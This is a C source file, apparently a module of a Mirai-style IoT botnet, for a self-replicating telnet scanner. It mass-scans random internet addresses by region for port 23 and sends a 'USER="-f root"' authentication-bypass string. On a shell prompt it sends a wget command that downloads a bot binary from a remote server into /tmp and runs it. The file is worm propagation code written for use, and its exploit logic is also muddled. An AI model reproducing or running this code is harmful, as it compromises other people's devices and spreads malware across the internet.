#ifdef SELFREP

#define _GNU_SOURCE

#include <unistd.h>
#include <stdlib.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <sys/select.h>
#include <sys/types.h>
#include <time.h>
#include <fcntl.h>
#include <signal.h>
#include <errno.h>
#include <string.h>
#include <netinet/ip.h>
#include <netinet/tcp.h>
#include <netinet/udp.h>

#include "includes.h"
#include "telnetbypass.h"
#include "table.h"
#include "rand.h"
#include "util.h"
#include "checksum.h"

int telnetbypass_scanner_pid = 0, telnetbypass_rsck = 0, telnetbypass_rsck_out = 0, telnetbypass_auth_table_len = 0;
char telnetbypass_scanner_rawpkt[sizeof(struct iphdr) + sizeof(struct tcphdr)] = {0};
struct telnetbypass_scanner_auth *telnetbypass_auth_table = NULL;
struct telnetbypass_scanner_connection *conn_table;
uint16_t telnetbypass_telnetbypass_auth_table_max_weight = 0;
uint32_t telnetbypass_fake_time = 0;
/* Telnet bypass scanner IP ranges - targets IoT devices with telnet auth bypass
 * Global coverage: All regions with IoT device deployments
 * Focus: Asia, Latin America, Africa where IoT devices are prevalent
 * Devices: Cameras, routers, set-top boxes with telnet enabled
 */
int tlbypass_ranges[] = {
    /* Asia - IoT hotspot */
    125,124,123,122,121,120,119,118,117,116,115,114,113,112,111,110,
    109,108,107,106,105,104,103,102,101,
    /* Latin America */
    201,200,191,190,189,187,186,181,180,179,177,
    /* Middle East */
    95,94,93,92,91,90,89,88,87,86,85,84,83,82,81,80,
    /* Africa */
    197,196,195,194,193,192,165,164,163,162,161,160,159,158,157,156,155,154,153,
    /* Europe */
    79,78,77,76,75,74,73,72,71,70,69,68,67,66,65,64,63,
    /* Asia-Pacific (Australia, Pacific) */
    203,202,210,211,218,219,220,
    /* North America */
    62,61,60,59,58,57,56,55,54,53,52,51,50,49,48,47,46,45,44,43,42,41,40,
    39,38,37,36,27,14,2,1,
    -1
};

int telnetbypass_recv_strip_null(int sock, void *buf, int len, int flags)
{
    int ret = recv(sock, buf, len, flags);

    if(ret > 0)
    {
        int i = 0;

        for(i = 0; i < ret; i++)
        {
            if(((char *)buf)[i] == 0x00)
            {
                ((char *)buf)[i] = 'A';
            }
        }
    }

    return ret;
}

void telnetbypass_scanner_init(void)
{
    int i = 0;
    uint16_t source_port;
    struct iphdr *iph;
    struct tcphdr *tcph;

    // Let parent continue on main thread
    telnetbypass_scanner_pid = fork();
    if(telnetbypass_scanner_pid > 0 || telnetbypass_scanner_pid == -1)
        return;

    LOCAL_ADDR = util_local_addr();

    rand_init();
    telnetbypass_fake_time = time(NULL);
    conn_table = calloc(TELNETBYPASS_SCANNER_MAX_CONNS, sizeof(struct telnetbypass_scanner_connection));
    for(i = 0; i < TELNETBYPASS_SCANNER_MAX_CONNS; i++)
    {
        conn_table[i].state = TELNETBYPASS_SC_CLOSED;
        conn_table[i].fd = -1;
        conn_table[i].credential_index = 0;
    }

    // Set up raw socket scanning and payload
    if((telnetbypass_rsck = socket(AF_INET, SOCK_RAW, IPPROTO_TCP)) == -1)
    {
        exit(0);
    }
    fcntl(telnetbypass_rsck, F_SETFL, O_NONBLOCK | fcntl(telnetbypass_rsck, F_GETFL, 0));
    i = 1;
    if(setsockopt(telnetbypass_rsck, IPPROTO_IP, IP_HDRINCL, &i, sizeof(i)) != 0)
    {
        close(telnetbypass_rsck);
        exit(0);
    }

    do
    {
        source_port = rand_next() & 0xFFFF;
    } while(ntohs(source_port) < 1024);

    // Build SYN packet for scanning
    iph = (struct iphdr *)telnetbypass_scanner_rawpkt;
    tcph = (struct tcphdr *)(iph + 1);

    // IP header
    iph->ihl = 5;
    iph->version = 4;
    iph->tot_len = htons(sizeof(struct iphdr) + sizeof(struct tcphdr));
    iph->id = rand_next();
    iph->ttl = 64;
    iph->protocol = IPPROTO_TCP;
    iph->saddr = LOCAL_ADDR;

    // TCP header
    tcph->source = source_port;
    tcph->dest = htons(23); // Telnet port
    tcph->seq = rand_next();
    tcph->doff = 5;
    tcph->syn = TRUE;
    tcph->window = rand_next() & 0xFFFF;
    tcph->check = checksum_generic((uint16_t *)telnetbypass_scanner_rawpkt, sizeof(telnetbypass_scanner_rawpkt) / 2);

    // Start scanner loop
    while(TRUE)
    {
        fd_set fdset;
        struct timeval timeo;
        struct sockaddr_in paddr;
        int mfd = 0, nfds;

        FD_ZERO(&fdset);
        FD_SET(telnetbypass_rsck, &fdset);
        mfd = telnetbypass_rsck;

        for(i = 0; i < TELNETBYPASS_SCANNER_MAX_CONNS; i++)
        {
            if(conn_table[i].state != TELNETBYPASS_SC_CLOSED)
            {
                FD_SET(conn_table[i].fd, &fdset);
                if(conn_table[i].fd > mfd)
                    mfd = conn_table[i].fd;
            }
        }

        timeo.tv_sec = 0;
        timeo.tv_usec = 1000;

        nfds = select(mfd + 1, &fdset, NULL, NULL, &timeo);
        if(nfds == -1)
        {
            break;
        }
        else if(nfds == 0)
        {
            // Timeout - send more SYN packets
            uint16_t pps = 0;
            struct iphdr *iph = (struct iphdr *)telnetbypass_scanner_rawpkt;
            struct tcphdr *tcph = (struct tcphdr *)(iph + 1);

            for(i = 0; i < TELNETBYPASS_SCANNER_RAW_PPS; i++)
            {
                iph->id = rand_next();
                iph->daddr = get_random_telnetbypass_ip();
                iph->check = 0;
                iph->check = checksum_generic((uint16_t *)iph, sizeof(struct iphdr) / 2);

                tcph->seq = rand_next();
                tcph->check = 0;
                tcph->check = checksum_generic((uint16_t *)telnetbypass_scanner_rawpkt, sizeof(telnetbypass_scanner_rawpkt) / 2);

                paddr.sin_family = AF_INET;
                paddr.sin_addr.s_addr = iph->daddr;
                paddr.sin_port = tcph->dest;

                sendto(telnetbypass_rsck, telnetbypass_scanner_rawpkt, sizeof(telnetbypass_scanner_rawpkt), MSG_NOSIGNAL, (struct sockaddr *)&paddr, sizeof(paddr));
            }

            // Process connection table
            for(i = 0; i < TELNETBYPASS_SCANNER_MAX_CONNS; i++)
            {
                struct telnetbypass_scanner_connection *conn = &conn_table[i];

                if(conn->state == TELNETBYPASS_SC_CLOSED)
                {
                    // Find new connection slot
                    int n = -1;
                    for(n = i; n < TELNETBYPASS_SCANNER_MAX_CONNS; n++)
                    {
                        if(conn_table[n].state == TELNETBYPASS_SC_CLOSED)
                        {
                            // Use this slot
                            conn = &conn_table[n];
                            conn->dst_addr = get_random_telnetbypass_ip();
                            conn->dst_port = 23;
                            break;
                        }
                    }

                    if(n == TELNETBYPASS_SCANNER_MAX_CONNS)
                        break;

                    telnetbypass_setup_connection(conn);
                }
            }
        }
        else
        {
            // Process incoming data
            for(i = 0; i < TELNETBYPASS_SCANNER_MAX_CONNS; i++)
            {
                struct telnetbypass_scanner_connection *conn = &conn_table[i];

                if(conn->state == TELNETBYPASS_SC_CLOSED)
                    continue;

                if((FD_ISSET(conn->fd, &fdset)))
                {
                    if(conn->state == TELNETBYPASS_SC_CONNECTING)
                    {
                        // Connection established - send exploit
                        int err = 0;
                        socklen_t err_len = sizeof(err);

                        getsockopt(conn->fd, SOL_SOCKET, SO_ERROR, &err, &err_len);
                        if(err != 0)
                        {
                            conn->state = TELNETBYPASS_SC_CLOSED;
                            continue;
                        }

                        // Send telnet authentication bypass exploit
                        // USER="-f root" telnet -a IP_ADDRESS [PORT]
                        // The -a flag bypasses authentication
                        char exploit_cmd[1024];
                        snprintf(exploit_cmd, sizeof(exploit_cmd), "USER=\"-f root\" telnet -a %d.%d.%d.%d %d\r\n",
                            (conn->dst_addr >> 24) & 0xFF,
                            (conn->dst_addr >> 16) & 0xFF,
                            (conn->dst_addr >> 8) & 0xFF,
                            conn->dst_addr & 0xFF,
                            conn->dst_port);

                        send(conn->fd, exploit_cmd, strlen(exploit_cmd), MSG_NOSIGNAL);
                        conn->state = TELNETBYPASS_SC_GET_CREDENTIALS;
                        conn->last_recv = telnetbypass_fake_time;
                    }
                    else if(conn->state == TELNETBYPASS_SC_GET_CREDENTIALS)
                    {
                        // Check if we got a shell prompt
                        if(strstr(conn->rdbuf, "#") != NULL || strstr(conn->rdbuf, "$") != NULL || strstr(conn->rdbuf, "login:") != NULL)
                        {
                            // Try to download and execute payload
                            char download_cmd[512];
                            snprintf(download_cmd, sizeof(download_cmd), "cd /tmp; wget http://%s/bins/axis.$(uname -m) -O /tmp/a; chmod +x /tmp/a; /tmp/a &\r\n",
                                HTTP_SERVER_IP);

                            send(conn->fd, download_cmd, strlen(download_cmd), MSG_NOSIGNAL);
                            conn->state = TELNETBYPASS_SC_CLOSED;
                        }
                        conn->state = TELNETBYPASS_SC_CLOSED;
                    }
                }

                // Check for timeout
                if(conn->state != TELNETBYPASS_SC_CLOSED && (telnetbypass_fake_time - conn->last_recv) > 30)
                {
                    conn->state = TELNETBYPASS_SC_CLOSED;
                    close(conn->fd);
                    conn->fd = -1;
                }
            }
        }

        telnetbypass_fake_time = time(NULL);
    }
}

void telnetbypass_kill(void)
{
    kill(telnetbypass_scanner_pid, 9);
}

static void telnetbypass_setup_connection(struct telnetbypass_scanner_connection *conn)
{
    struct sockaddr_in addr;
    int flags;

    conn->fd = socket(AF_INET, SOCK_STREAM, 0);
    if(conn->fd == -1)
    {
        conn->state = TELNETBYPASS_SC_CLOSED;
        return;
    }

    flags = fcntl(conn->fd, F_GETFL, 0);
    fcntl(conn->fd, F_SETFL, O_NONBLOCK | flags);

    addr.sin_family = AF_INET;
    addr.sin_addr.s_addr = conn->dst_addr;
    addr.sin_port = htons(conn->dst_port);

    conn->state = TELNETBYPASS_SC_CONNECTING;
    conn->last_recv = telnetbypass_fake_time;
    conn->rdbuf_pos = 0;
    memset(conn->rdbuf, 0, sizeof(conn->rdbuf));

    connect(conn->fd, (struct sockaddr *)&addr, sizeof(addr));
}

static ipv4_t get_random_telnetbypass_ip(void)
{
    uint32_t o1, o2, o3, o4;
    int range_idx;

    do
    {
        range_idx = rand() % (sizeof(tlbypass_ranges)/sizeof(int));
        o1 = tlbypass_ranges[range_idx];

        o2 = rand_next() % 256;
        o3 = rand_next() % 256;
        o4 = rand_next() % 256;

    } while(o2 == 0 || o2 == 255 || o3 == 0 || o3 == 255);

    return INET_ADDR(o1,o2,o3,o4);
}

#endif
